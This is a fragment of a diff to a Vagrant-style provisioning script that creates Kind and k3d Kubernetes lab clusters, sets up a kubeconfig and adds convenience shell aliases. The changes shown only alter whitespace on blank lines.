 alias kind-status='kubectl get nodes && kubectl get pods -A'
 EOF
-
+            
           else
             echo "ERROR: Kind cluster creation failed"
             exit 1
@@ -1872,17 +2526,17 @@ EOF
           # Create new cluster
           if k3d cluster create lab --config /opt/k3d/config.yaml; then
             echo "K3d cluster 'lab' created successfully!"
-
+            
             # Set up kubeconfig
             mkdir -p /home/vagrant/.kube
             k3d kubeconfig get lab > /home/vagrant/.kube/config
             chown -R vagrant:vagrant /home/vagrant/.kube
-
+            
             echo ""
             echo "Cluster status:"
             kubectl cluster-info
             kubectl get nodes
-
+            
             # Create convenience aliases
             cat >> /home/vagrant/.bashrc <<'EOF'
 # K3d aliases
@@ -1890,7 +2544,7 @@ alias k3d-kill='k3d cluster delete lab'
 alias k3d-restart='k3d cluster delete lab && k3d cluster create lab --config /opt/k3d/config.yaml'
 alias k3d-status='kubectl get nodes && kubectl get pods -A'
 EOF
-
+            
           else
             echo "ERROR: K3d cluster creation failed"
             exit 1
